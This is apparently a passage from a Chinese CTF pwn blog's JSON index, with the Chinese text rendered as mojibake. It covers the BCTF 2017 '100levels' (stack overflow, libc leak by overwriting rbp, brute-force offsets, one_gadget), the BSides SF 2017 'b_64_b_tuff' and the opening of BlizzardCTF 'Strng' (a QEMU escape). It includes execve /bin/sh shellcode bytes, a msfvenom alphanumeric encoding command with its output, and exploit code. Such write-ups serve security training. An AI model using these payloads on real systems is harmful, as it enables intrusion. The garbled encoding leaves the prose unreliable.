32ä½æ“ä½œæ¨¡å¼ä¸‹ä¸å¯ç”¨ã€‚sysenteræ˜¯æœ€å¸¸ç”¨äºä»¥32ä½æ“ä½œæ¨¡å¼è°ƒç”¨ç³»ç»Ÿè°ƒç”¨çš„æŒ‡ä»¤ã€‚å®ƒç±»ä¼¼äºsyscallï¼Œä½†æ˜¯ä½¿ç”¨èµ·æ¥æœ‰ç‚¹å›°éš¾ï¼Œä½†è¿™æ˜¯å†…æ ¸çš„å…³æ³¨ç‚¹ã€‚int 0x80 æ˜¯è°ƒç”¨ç³»ç»Ÿè°ƒç”¨çš„ä¼ ç»Ÿæ–¹å¼ï¼Œåº”é¿å…ä½¿ç”¨ï¼Œæ˜¯32ä½ç¨‹åºä¸‹çš„ã€‚\n\nç³»ç»Ÿè°ƒç”¨æŸ¥è¯¢ç½‘å€ï¼šhttps://syscalls.w3challs.com/\n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n\n \n\n \n","tags":["hijackStack"],"categories":["PWN","hijackStack0x4"]},{"title":"BCTF 2017-100levels","url":"/2021/08/14/BCTF 2017-100levels/","content":"\n1.å¸¸è§„checksecï¼Œå¼€å¯äº†NXå’ŒPIEï¼Œä¸èƒ½shellcodeå’Œç®€å•ropã€‚ä¹‹åIDAæ‰“å¼€æ‰¾æ¼æ´ï¼ŒE43å‡½æ•°ä¸­å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n__int64 buf; // [rsp+10h] [rbp-30h]\n--------------------------------------------------\nread(0, &buf, 0x400uLL);\n```\n\næœ‰æ ˆæº¢å‡ºé‚£ä¹ˆé¦–å…ˆæƒ³åˆ°æ˜¯åº”è¯¥æŸ¥çœ‹æœ‰æ²¡æœ‰åé—¨ï¼Œä½†æ˜¯è¿™ä¸ªç¨‹åºè™½ç„¶å¤–éƒ¨å¼•ç”¨äº†systemå‡½æ•°ï¼Œä½†æ˜¯æœ¬èº«é‡Œå¹¶æ²¡æœ‰å¯¼å…¥åˆ°.got.pltè¡¨ä¸­ï¼Œæ²¡åŠæ³•ç›´æ¥é€šè¿‡.got.pltæ¥å¯»å€ã€‚è€Œä¸”å¼€äº†PIEï¼Œå°±ç®—å¯¼å…¥åˆ°.got.pltè¡¨ä¸­ï¼Œä¹Ÿéœ€è¦è¦†ç›–è¿”å›åœ°å€å¹¶ä¸”çˆ†ç ´å€’æ•°ç¬¬å››ä½æ‰èƒ½è·³è½¬åˆ°systemå‡½æ•°ã€‚è™½ç„¶æœ‰æ ˆæº¢å‡ºï¼Œä½†æ˜¯æ²¡æœ‰åé—¨å‡½æ•°ï¼ŒåŒæ ·ä¹Ÿæ²¡åŠæ³•æ³„éœ²Libcåœ°å€ã€‚\n\n2.æƒ³getshellï¼Œåˆåªæœ‰ä¸€ä¸ªæ ˆæº¢å‡ºï¼Œæ²¡æœ‰å…¶å®ƒæ¼æ´ï¼Œè¿˜å¼€äº†PIEå’ŒNXï¼Œé‚£ä¹ˆä¸€å®šå¾—æ³„éœ²å‡ºåœ°å€æ‰èƒ½åšï¼Œè€Œprintfåœ°å€ä¹Ÿå› ä¸ºPIEæ²¡åŠæ³•ç›´æ¥è·³è½¬ã€‚é™·å…¥å¡é¡¿ï¼Œä½†æ˜¯è¿™é‡Œå¯ä»¥æŸ¥çœ‹E43å‡½æ•°ä¸­çš„printfçš„æ±‡ç¼–ä»£ç ï¼š\n\nåªèƒ½é€šè¿‡æ ˆæº¢å‡ºå½¢å¼æ¥ä¸ºä¸‹ä¸€æ¬¡çš„printfèµ‹å‚æ•°æ¥æ³„éœ²ã€‚åˆç”±äºPIEï¼Œä¹Ÿä¸çŸ¥é“ä»»æ„ä¸€ä¸ªå‡½æ•°çš„ä»£ç åœ°å€ï¼Œé‚£ä¹Ÿæ²¡åŠæ³•æ³„éœ²è¢«åŠ è½½è¿›å…¥Libcä¸­çš„å†…å­˜åœ°å€ã€‚\n\n3.é€šè¿‡è°ƒè¯•å¯ä»¥çœ‹åˆ°ï¼Œè¿›å…¥E43å‡½æ•°ä¸­ï¼ŒæŠµè¾¾printfå‡½æ•°æ—¶ï¼Œæ ˆé¡¶çš„ä¸Šæ–¹æœ‰å¤§é‡çš„æŒ‡å‘libcçš„åœ°å€ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191532908.png)\n\nå¹¶ä¸”è§‚å¯ŸE43å‡½æ•°ä¸­çš„æ±‡ç¼–ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°Printfæ˜¯é€šè¿‡rbpå–å€¼çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡æ ˆæº¢å‡ºä¿®æ”¹rbpæ¥ä½¿å¾—[rbp+var_34]è½åœ¨å…¶å®ƒåœ°æ–¹ï¼Œè€Œå¦‚æœè¿™ä¸ªå…¶å®ƒåœ°æ–¹æœ‰libcåœ°å€ï¼Œé‚£ä¹ˆå°±ç›¸å½“äºæ³„éœ²å‡ºäº†Libcåœ°å€ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191532014.jpeg)\n\n4.è¿™ä¸ªå…³å¡æ•°æ˜¯ç”±æˆ‘ä»¬è®¾ç½®çš„ï¼Œè€Œä¸”é€šè¿‡é€’å½’è°ƒç”¨E43å‡½æ•°ï¼Œå½¢æˆå¤šä¸ªE43çš„æ ˆï¼Œé‚£ä¹ˆè¿›è¡Œè°ƒè¯•ï¼Œç¬¬äºŒæ¬¡è¿›å…¥E43çš„æ ˆä¹‹åï¼Œä»ç„¶åœ¨è¿è¡Œåˆ°printfå‡½æ•°æ—¶ï¼Œæ ˆé¡¶ä¸Šæ–¹ä»æ—§æœ‰å¤§é‡çš„Libcåœ°å€ã€‚ç”±äºæˆ‘ä»¬éœ€è¦ä¿®æ”¹rbpæ¥ä½¿å¾—ä¸‹ä¸€æ¬¡çš„printfæ‰“å°å‡ºlibcåœ°å€ï¼Œé‚£ä¹ˆå…³å¡æœ€ä½éœ€è¦è®¾ç½®ä¸¤å…³ï¼Œç¬¬ä¸€å…³ç”¨æ¥æ ˆæº¢å‡ºï¼Œä¿®æ”¹rbpï¼Œä½¿å¾—ç¬¬äºŒå…³ä¸­çš„printfå‡½æ•°æŒ‡å‘æ ˆé¡¶ä¸Šæ–¹ä»è€Œæ‰“å°å‡ºLibcåœ°å€ã€‚\n\n5.ç”±äºæ ˆçš„éšæœºåŒ–ï¼Œæˆ‘ä»¬å¦‚æœéšæ„ä¿®æ”¹rbpé‚£ä¹ˆå°±ä¼šæ‰“å°å‡ºå¥‡æ€ªçš„ä¸œè¥¿ï¼Œæ‰€ä»¥ä¿®æ”¹rbpçš„æœ€åä¸€ä¸ªå­—èŠ‚ï¼Œä½¿å¾—[rbp+var_34]èƒ½å¤Ÿç§»åŠ¨ä¸€å®šèŒƒå›´ï¼Œä»¥ä¸€å®šå‡ ç‡å‘½ä¸­æ ˆé¡¶ä¸Šæ–¹ã€‚è€Œåˆç”±äºæ˜¯é€’å½’è°ƒç”¨ï¼Œç¬¬ä¸€å…³çš„æ ˆåœ¨ç¬¬äºŒå…³çš„æ ˆçš„ä¸Šæ–¹ï¼Œæ¨¡å‹å¤§è‡´å¦‚ä¸‹ï¼š\n\n(1)ç¬¬ä¸€æ¬¡rbpå’Œrspä»¥åŠç¬¬äºŒæ¬¡çš„å¦‚å›¾ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191532743.png)  ![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191532872.png)\n\n(2)ç¬¬ä¸€æ¬¡æ ˆä»¥åŠç¬¬äºŒæ¬¡æ ˆå¦‚å›¾ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191532846.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191532270.png)\n\nâ–²è¿™é‡Œç”¨çš„æ˜¯Libc-2.32çš„ï¼Œç”¨å…¶ä»–çš„Libcå°±ä¸å¤ªä¸€æ ·ï¼Œå…·ä½“æƒ…å†µå…·ä½“åˆ†æã€‚\n\n6.è¿™é‡Œçš„æ¨¡å‹æ˜¯å‡è®¾ç¬¬ä¸€æ¬¡çš„rspæ ˆé¡¶åä¸¤ä½ä¸º00ï¼Œä½†æ˜¯ç”±äºæ ˆåœ°å€éšæœºåŒ–ï¼Œæ‰€ä»¥rspå…¶å®å¯ä»¥ä»0x00-0xFFä¹‹é—´å˜åŒ–ï¼Œå¯¹åº”çš„åœ°å€ä¹Ÿå°±æ˜¯ä»0-31ä¹‹é—´å˜åŒ–ã€‚\n\n7.è¿™é‡Œå…ˆè€ƒè™‘ç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œrbp-var34å¦‚ä½•è½åˆ°libcç©ºé—´ä¸­ï¼Œä¹Ÿå°±æ˜¯å½“0å¾€ä¸‹ç§»åŠ¨ï¼Œå˜åŒ–ä¸ºå¤§çº¦æ˜¯4æˆ–è€…5æ—¶ï¼Œå³å¯è½åˆ°libcç©ºé—´ã€‚åŒæ ·çš„ï¼Œä»5-16å˜åŒ–ï¼Œéƒ½å¯ä»¥ä½¿å¾—rbp-var34è½åœ¨libcç©ºé—´ã€‚ä½†æ˜¯å¦‚æœ0å˜åŒ–æˆ16ä»¥ä¸Šï¼Œå¯¹åº”çš„ç¬¬äºŒæ¬¡æ ˆç©ºé—´rbpå°±ä¼šå˜æˆ32ä»¥ä¸Šï¼Œæ¢ç®—æˆ16è¿›åˆ¶ä¸º0x100ï¼Œè¿™æ—¶ä¿®æ”¹æœ€åä¸¤ä½ï¼Œå°±ä¼šå˜æˆ0x15cï¼Œä½¿å¾—å®ƒä¸ä½†ä¸å¾€ä¸Šèµ°ï¼Œæ›´ä¼šå¾€ä¸‹èµ°ï¼Œä»è€Œæ²¡åŠæ³•è½åˆ°libcç©ºé—´ã€‚æ€»è€Œè¨€ä¹‹ï¼Œæ…¢æ…¢ç ”ç©¶ä¸‹ï¼Œç„¶åè®¡ç®—æ¦‚ç‡å¤§çº¦ä¸º12/32=3/8ï¼Œå¯ä»¥ä½¿å¾—è½åœ¨Libcç©ºé—´ã€‚è¿™é‡Œçš„5cå¯ä»¥æ”¹å˜æˆå…¶å®ƒå€¼xï¼Œä½†æ˜¯éœ€è¦x-0x34ä¸º8çš„å€æ•°æ‰è¡Œï¼Œä¸ç„¶å–åˆ°çš„åœ°å€ä¼šæ˜¯æˆªæ–­çš„ï¼Œä½†æ˜¯ä¿®æ”¹åæˆåŠŸæ¦‚ç‡ä¼šå‘ç”Ÿæ”¹å˜ï¼Œå› ä¸º0x5cæ‰«åˆ°çš„åœ°å€èŒƒå›´å¤§æ¦‚å°±æ˜¯libcçš„æ ˆç©ºé—´ã€‚\n\n8.è½åœ¨libcç©ºé—´ä¸ä»£è¡¨ä¸€å®šå°±ä¼šè½åœ¨æŒ‡å‘Libcåœ°å€ä¸Šï¼Œå‰é¢å¯ä»¥çœ‹åˆ°ï¼Œåœ¨16ä¸ªåœ°å€èŒƒå›´å†…å¤§æ¦‚ä¸º7ä¸ªï¼Œä¹Ÿå°±æ˜¯1/2çš„æ¦‚ç‡æˆåŠŸã€‚ç„¶åç”±äºæœ‰v2%a1è¿™ä¸ªè¿ç®—ï¼Œä¹Ÿå°±å¯¹åº”æ±‡ç¼–ä»£ç idiv   [rbp+var_34]ï¼Œè¿™å°±å¯¼è‡´å¦‚æœrbp+var_34çš„æ•°æ®ä¸º0é‚£ä¹ˆå°±ä¼šäº§ç”Ÿé™¤é›¶æ“ä½œï¼Œè¿™é‡Œæ²¡åŠæ³•å»æ‰ã€‚éœ€è¦è¿›è¡Œtryæ“ä½œæ¥å»é™¤è¿™ä¸ªé”™è¯¯ï¼Œä½¿ç¨‹åºé‡æ–°è¿è¡Œï¼Œè¿›è¡Œè‡ªåŠ¨åŒ–çˆ†ç ´ã€‚åŒæ—¶æ³„éœ²å‡ºæ¥çš„åœ°å€ä¼šå‘ç°æœ‰æ—¶å€™æ˜¯æ­£æ•°æœ‰æ—¶å€™æ˜¯è´Ÿæ•°ã€‚è¿™æ˜¯å› ä¸ºæˆ‘ä»¬åªèƒ½æ³„éœ²å‡ºåœ°å€çš„ä½32ä½ï¼Œä½8ä¸ªåå…­è¿›åˆ¶æ•°ã€‚è€Œè¿™ä¸ªæ•°çš„æœ€é«˜ä½å¯èƒ½æ˜¯0æˆ–è€…1ï¼Œè½¬æ¢æˆæœ‰ç¬¦å·æ•´æ•°å°±å¯èƒ½æ˜¯æ­£è´Ÿä¸¤ç§æƒ…å†µã€‚è¿™é‡Œè¿›è¡Œå¤„ç†å¯é¿å…æˆåŠŸç‡ä¸‹é™ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nif addr_l8 < 0:\naddr_l8 = addr_l8 + 0x100000000\n```\n\n9.ä½†æ˜¯æ³„éœ²å‡ºæ¥çš„åœ°å€ç”±äºprintfçš„å‚æ•°æ˜¯%dï¼Œæ‰€ä»¥æ‰“å°å‡ºæ¥çš„æ˜¯32ä½åœ°å€ï¼Œè¿˜éœ€è¦çŒœå‰©ä¸‹32ä½ã€‚ä½†æ˜¯è¿™é‡Œæœ‰ä¸ªæŠ€å·§ï¼Œè²Œä¼¼æ‰€æœ‰64ç¨‹åºåŠ è½½åçš„ä»£ç æ®µåœ°å€éƒ½åœ¨0x000055XXXXXXXXXX-0x000056XXXXXXXXXXä¹‹é—´å¾˜å¾Šï¼Œå¯¹åº”çš„libcåŠ è½½æ®µåœ¨0x00007EXXXXXXXXXX-0x00007FXXXXXXXXXXèŒƒå›´ï¼Œä»¥ä¸‹æ˜¯æµ‹è¯•æ•°æ®ï¼š\n\nç¨‹åºå¼€å¤´æ®µ.loadé¦–åœ°å€å’Œdebugæ®µé¦–åœ°å€ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n00007F1301D2A000  \n000056238FCAB000\nå·®å€¼ä¸º28EF 7207 F000\n\n00007FCB31061000\n000055D513E06000\nå·®å€¼ä¸º29F6 1D25 B000\n\n00007F58EFF09000\n000055F7C1BEC000\nå·®å€¼ä¸º2983 DC10 3000\n```\n\nå…·ä½“åŸç†å¥½åƒæ˜¯PIEæºä»£ç éšæœºçš„å…³ç³»ï¼Œä½†å…·ä½“ä¸å¤ªæ¸…æ¥šï¼Œèƒ½ç”¨å°±è¡Œã€‚æ‰€ä»¥é«˜32ä½å°±å¯ä»¥å‡è®¾åœ°å€ä¸º0x00007fxxï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦çˆ†ç ´0x1ffå¤§å°ï¼Œä¹Ÿå°±æ˜¯511ï¼Œç›¸å½“äº512æ¬¡ï¼Œä½†æ˜¯å…¶å®å¯ä»¥çŸ¥é“ï¼Œå¤§æ¦‚ç‡æ˜¯è½åœ¨0x7fé‡Œï¼Œçœ‹æ•°æ®åˆ†æä¹Ÿå¯ä»¥çŸ¥é“ï¼Œæ‰€ä»¥å®é™…çˆ†ç ´æ¬¡æ•°åŸºæœ¬åœ¨500æ¬¡ä»¥å†…ã€‚æ‰€ä»¥å°†æ³„éœ²å‡ºæ¥çš„åœ°å€åŠ ä¸Šä¸€ä¸ªåœ¨0x7fé‡Œçš„å€¼ï¼Œä¹Ÿå°±æ˜¯addr = addr_l8 + 0x7f8b00000000ï¼Œä¹‹åå†æ ¹æ®Libcç©ºé—´ä¸­æŒ‡å‘libcåœ°å€çš„åä¸¤ä½æ¥åŒºåˆ†åœ°å€ï¼šå¹¶å‡å»åœ¨libcä¸­æŸ¥åˆ°çš„åç§»é‡å³å¯å¾—åˆ°LibcåŸºåœ°å€ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nif hex(addr)[-2:] == '0b': #__IO_file_overflow+EB\nlibc_base = addr - 0x7c90b\n\nelif hex(addr)[-2:] == 'd2': #puts+1B2\nlibc_base = addr - 0x70ad2\n\nelif hex(addr)[-3:] == '600':#_IO_2_1_stdout_\nlibc_base = addr - 0x3c2600\n\nelif hex(addr)[-3:] == '400':#_IO_file_jumps\nlibc_base = addr - 0x3be400\n\nelif hex(addr)[-2:] == '83': #_IO_2_1_stdout_+83\nlibc_base = addr - 0x3c2683\n\nelif hex(addr)[-2:] == '32': #_IO_do_write+C2\nlibc_base = addr - 0x7c370 - 0xc2\n\nelif hex(addr)[-2:] == 'e7': #_IO_do_write+37\nlibc_base = addr - 0x7c370 - 0x37\n```\n\næ‰€ä»¥ç®—ä¸Šå‘½ä¸­æ¦‚ç‡ï¼Œå…¶å®è°ƒè¯•çš„æ—¶å€™å¯ä»¥çœ‹åˆ°ï¼Œç¬¬ä¸€å…³çš„æ ˆç©ºé—´ä¸­ç”±äºç¨‹åºè¿è¡Œç»“æœä¹Ÿä¼šæœ‰å‡ ä¸ªæŒ‡å‘Libcåœ°å€ï¼ŒåŠ ä¸Šè¿™å‡ ä¸ªä¹Ÿå¯ä»¥æé«˜æˆåŠŸç‡ï¼Œå› ä¸ºä¿®æ”¹çš„rbpä¹Ÿæ˜¯æœ‰å¯èƒ½è½åœ¨ç¬¬ä¸€å…³çš„æ ˆç©ºé—´ã€‚æ€»çš„çˆ†ç ´æ¬¡æ•°åº”è¯¥å°±æ˜¯500/((1/2)*(3/8))ï¼Œçº¦ä¸º2500æ¬¡ï¼Œè¿˜èƒ½æ¥å—ã€‚\n\n10.æ³„éœ²å‡ºLibcåœ°å€ä¹‹åä¸€èˆ¬å°±æœ‰ä¸¤ç§æ–¹æ³•ï¼Œä¸€ç§æ˜¯åˆ©ç”¨æ ˆæº¢å‡ºï¼Œè°ƒç”¨ä¸‡èƒ½gadgetç”¨systemå‡½æ•°è¿›è¡Œbinshå­—ç¬¦ä¸²èµ‹å€¼ï¼Œä»è€Œgetshellã€‚è¿˜æœ‰ä¸€ç§å°±æ˜¯ï¼Œåˆ©ç”¨one_gadgetæ¥getshellï¼Œé€šè¿‡æŸ¥çœ‹E43è¿”å›æ—¶çš„æ±‡ç¼–ä»£ç æœ‰ä¸€ä¸ªmove eax,0ï¼›æ»¡è¶³libc-2.23.soçš„å…¶ä¸­ä¸€ä¸ªone_gadgetçš„æ¡ä»¶ï¼Œé‚£ä¹ˆç›´æ¥ç”¨å°±è¡Œã€‚\n\n11.æœ€ålibcåŸºåœ°å€åŠ ä¸Šone_gadgetçš„åç§»åœ°å€å°±å¯ä»¥å¾—åˆ°one_gadgetçš„å®é™…åœ°å€ã€‚\n\none_gadget = libc_base + 0x45526\n\nä¹‹ååœ¨ç¬¬äºŒå…³ä¸­å†æ¬¡è¿›è¡Œæ ˆæº¢å‡ºè¦†ç›–ripæ¥è·³è½¬åˆ°one_gadgetå³å¯getshellã€‚\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n\n \n","tags":["PIE"],"categories":["PWN","PIE0x7"]},{"title":"BSides San Francisco CTF 2017-b_64_b_tuff","url":"/2021/08/14/BSides San Francisco CTF 2017-b_64_b_tuff/","content":"\n \n\n1.å¸¸è§„checksecä¸‹ï¼Œåªå¼€äº†NXï¼Œä¹‹åIDAæ‰“å¼€æ–‡ä»¶ä¹‹åï¼Œæœ‰å¦‚ä¸‹è¯­å¥ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ns = (char *)base64_encode((int)buf, v7, v5);\n((void (*)(void))v5)();\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191555015.jpeg)\n\nè¿™é‡Œv7æ˜¯è¾“å…¥çš„Bufï¼Œv5æ˜¯mmapåˆ†é…çš„å†…å­˜ç©ºé—´ã€‚ä¹‹åçš„è¯­å¥ï¼šä»£è¡¨äº†å°†v5å¯¹åº”çš„å†…å­˜ç©ºé—´å¼ºåˆ¶è½¬åŒ–ä¸ºå‡½æ•°æŒ‡é’ˆå¹¶ä¸”è°ƒç”¨ï¼Œåœ¨æ±‡ç¼–ä»£ç ä¸­ä¹Ÿå¯ä»¥çœ‹å‡ºæ¥ï¼šè¿™é‡Œçš„[ebp+var_18]å°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„bufç»è¿‡ç¼–ç base64ç¼–ç åå­˜æ”¾çš„åœ°æ–¹ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\ntext:0804879C var_18          = dword ptr -18h\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191555021.jpeg)\n\n3.æ‰€ä»¥æˆ‘ä»¬è¾“å…¥çš„å†…å®¹å°±æˆäº†ä¼šè¢«æ‰§è¡Œçš„æ±‡ç¼–ä»£ç ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥è¾“å…¥Shellcodeï¼Œæ¥æ‰§è¡Œæˆ‘ä»¬éœ€è¦çš„å‘½ä»¤ã€‚è¿™é‡Œå¯ä»¥çœ‹ä¸€ä¸ªè¿æ¥ç½‘å€ï¼Œä»é‡Œé¢æ‰¾shellcodeï¼š\n\nhttp://shell-storm.org/shellcode/\n\nå¯ä»¥é€šè¿‡linux/x86/sh/bash/execve/shellcodeç­‰ç­‰å…³é”®è¯æ¥æŸ¥æ‰¾ï¼Œè¿™é‡Œç›´æ¥ç»™å‡ºä¸€ä¸ªå¯ç”¨çš„shellcode:\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191555344.jpeg)\n\n \n\n```\n#æ³¨é‡Šå¤´\n\n\\x31\\xc9\\xf7\\xe1\\xb0\\x0b\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80\n```\n\n4.ä½†æ˜¯æœ‰Base64_encodeï¼Œæ‰€ä»¥æˆ‘ä»¬è¾“å…¥çš„éœ€è¦ä¼šè¢«base64ç¼–ç ï¼Œè€Œbase64ç¼–ç åªèƒ½ç”±åªç”±0-9ï¼Œa-zï¼ŒA-Zï¼Œ+ï¼Œ/è¿™äº›å­—ç¬¦ç»„æˆï¼Œ(è¿™é‡Œå°±æ˜¯å¯¹åº”çš„asciiè½¬æ¢è¡¨ä¸­å†…å®¹)æ‰€ä»¥å¸¸è§„çš„shellcodeå°±ä¸åˆæ ¼ï¼Œæˆ‘ä»¬è¿™é‡Œé€‰ä¸­çš„shellcodeä¸­æŸäº›å­—ç¬¦å°±æ²¡åŠæ³•è¢«base64ç¼–ç ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦ç”¨åˆ°msfvenomæ¥é€‰æ‹©ä¸€ä¸ªå¯ç”¨çš„ç¼–ç å™¨ï¼Œå°†æˆ‘ä»¬å¸¸è§„çš„shellcodeç¼–ç æˆå¯ä»¥è¢«base64ç¼–ç çš„shellcodeã€‚\n\n5.æ‰“å¼€Linuxï¼Œè¾“å…¥msfvenom -l encoderså¯ä»¥æŸ¥çœ‹ç¼–ç å™¨ï¼Œåé¢æœ‰ä»‹ç»ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹ï¼Œä»ä¸­é€‰æ‹©ä¸€ä¸ªå¯ç”¨çš„ç¼–ç å™¨å¯¹shellcodeè¿›è¡Œç¼–ç å³å¯ã€‚\n\n6.æŸ¥åˆ°x86/alpha_mixedè¿™ä¸ªç¼–ç å™¨å¯ä»¥å°†æˆ‘ä»¬è¾“å…¥çš„shellcodeç¼–ç æˆå¤§å°å†™æ··åˆçš„ä»£ç ï¼Œç¬¦åˆæ¡ä»¶ã€‚\n\nx86/alpha_mixed low Alpha2 Alphanumeric Mixedcase Encoder\n\nè¿è¡Œç¼–ç å™¨çš„ä»£ç å¦‚ä¸‹ï¼š\n\npython -c 'import sys; sys.stdout.write(\"\\x31\\xc9\\xf7\\xe1\\xb0\\x0b\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80\")' | msfvenom -p - -e x86/alpha_mixed -a linux -f raw -a x86 --platform linux BufferRegister=EAX -o payload\n\n7.è¾“å…¥è¿™æ®µä»£ç è¿è¡Œä¹‹åå¯ä»¥çœ‹åˆ°å½“å‰æ–‡ä»¶å¤¹ç›®å½•ä¸‹ç”Ÿæˆäº†ä¸€ä¸ªpayloadæ–‡ä»¶ï¼Œæ–‡æœ¬æ‰“å¼€å°±å¯ä»¥çœ‹åˆ°ç¼–ç åçš„shellcode:\n\nPYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIp1kyigHaX06krqPh6ODoaccXU8ToE2bIbNLIXcHMOpAA\n\n8.ä¹‹åéœ€è¦å°†è¿™æ®µå¯ä»¥è¢«Base64ç¼–ç çš„è¿›è¡ŒBase64è§£ç ï¼Œå¾—åˆ°çš„shellcodeå†è¢«ç¨‹åºä¸­çš„Base64ç¼–ç åæ‰æ˜¯æˆ‘ä»¬çœŸæ­£èµ·ä½œç”¨çš„shellcodeã€‚åˆ©ç”¨pythonè„šæœ¬å³å¯ã€‚\n\n \n\n \n\n \n\nâ–²\n\n1.â€™import sys; sys.stdout.write(â€œshellcodeâ€)â€™ï¼šè¿™æ˜¯å¯¼å…¥åŒ…ä¹‹åå†™å…¥ç¼–ç çš„shellcodeã€‚\n\n2.ç”±äºmsfvenomåªèƒ½ä»stdinä¸­è¯»å–ï¼Œæ‰€ä»¥ä½¿ç”¨Linuxç®¡é“ç¬¦â€|â€æ¥ä½¿å¾—shellcodeä½œä¸ºpythonç¨‹åºçš„è¾“å‡ºã€‚\n\n3.æ­¤å¤–é…ç½®ç¼–ç å™¨ä¸ºx86/alpha_mixedï¼Œé…ç½®ç›®æ ‡å¹³å°æ¶æ„ç­‰ä¿¡æ¯ï¼Œè¾“å‡ºåˆ°æ–‡ä»¶åä¸ºpayloadçš„æ–‡ä»¶ä¸­ã€‚\n\n4.ç”±äºåœ¨b-64-b-tuffä¸­æ˜¯é€šè¿‡æŒ‡ä»¤call eaxè°ƒç”¨shellcodeçš„eax,æ‰€ä»¥é…ç½®BufferRegister=EAXã€‚æœ€åå³å¯åœ¨payloadä¸­çœ‹åˆ°å¯¹åº”çš„è¢«ç¼–ç åçš„ä»£ç ã€‚è¿™æ®µshellcodeä»£ç å°±å¯ä»¥è¢«base64ç¼–ç æˆæˆ‘ä»¬éœ€è¦çš„æ±‡ç¼–ä»£ç ã€‚\n\n \n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["shellcode"],"categories":["PWN","Shellcode0x2"]},{"title":"BlizzardCTF2017-Strng","url":"/2021/08/14/BlizzardCTF2017-Strng/","content":"\n1.æ‰“å¼€è™šæ‹Ÿç¯å¢ƒï¼Œç„¶åéƒ½è¯´flagåœ¨/root/flagï¼Œç»™çš„ä¹Ÿä¸æ˜¯vmlinuxï¼Œé‚£ä¹ˆå°±åº”è¯¥æ˜¯qemué€ƒé€¸ã€‚\n\n2.ç”±äºåªæœ‰æ–‡ä»¶ï¼Œå¤§ä½¬ä»¬éƒ½ç›´æ¥å‘Šè¯‰ç”¨æˆ·åå¯†ç ï¼Œä¹Ÿæ²¡è¯´æ€ä¹ˆæ‰¾ï¼Œé‚£å°±å½“ä½œæœ¬æ¥é¢˜ç›®ç»™äº†ç”¨æˆ·åå’Œå¯†ç ã€‚ç”¨æˆ·åæ˜¯ubuntuï¼Œå¯†ç æ˜¯passw0rdã€‚\n\n3.å°†qemu-system-x86_64æ‹–åˆ°IDAä¸­å¼€å§‹åˆ†æï¼Œä¼šåˆ†æå¾ˆé•¿ä¸€æ®µæ—¶é—´ï¼Œå…ˆçœ‹çœ‹å¯åŠ¨å‚æ•°ï¼Œlaunch.shï¼š\n\n```\n./qemu-system-x86_64 \\\n    -m 1G \\\n    -device strng \\\n    -hda my-disk.img \\\n    -hdb my-seed.img \\\n    -nographic \\\n    -L pc-bios/ \\\n    -enable-kvm \\\n    -device e1000,netdev=net0 \\\n    -netdev user,id=net0,hostfwd=tcp::5555-:22\n```\n\næ²¡å•¥å¥½æ³¨æ„çš„ï¼Œæ˜¾ç¤ºåŠ è½½äº†è®¾å¤‡strngï¼Œé‚£ä¹ˆè¿™åº”è¯¥å°±æ˜¯éœ€è¦åˆ†æçš„PCIè®¾å¤‡ã€‚ç„¶åæœ€åä¸€è¡Œnetdev user,id=net0,hostfwd=tcp::5555-:22ï¼ŒæŠŠ22ç«¯å£é‡å®šå‘åˆ°äº†å®¿ä¸»æœºçš„5555ç«¯å£ï¼Œæ‰€ä»¥ä½¿ç”¨ssh ubuntu@127.0.0.1 -p 5555è¿›å»ã€‚åŒæ—¶è¿™é‡Œæ³¨æ„åŠ è½½å†…å­˜è¦1Gï¼Œä¸ºäº†é˜²æ­¢å´©æºƒï¼Œæˆ‘æ”¹æˆäº†128Mã€‚\n\n4.ç„¶åè¿›å…¥qemuä¸­çœ‹çœ‹è®¾å¤‡ä¿¡æ¯ï¼Œå¥½æ‰¾åˆ°mmioå’Œpmioçš„åœ°å€ï¼š\n\n(1)é¦–å…ˆè¾“å…¥lspciï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªUnclassified device\n\n00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)\n\nè¿™ä¸ªå°±åº”è¯¥æ˜¯strngè®¾å¤‡äº†ã€‚\n\n(2)åŠ è½½IDAå®Œæˆä¹‹åéªŒè¯ä¸€ä¸‹ï¼Œå‡½æ•°æ 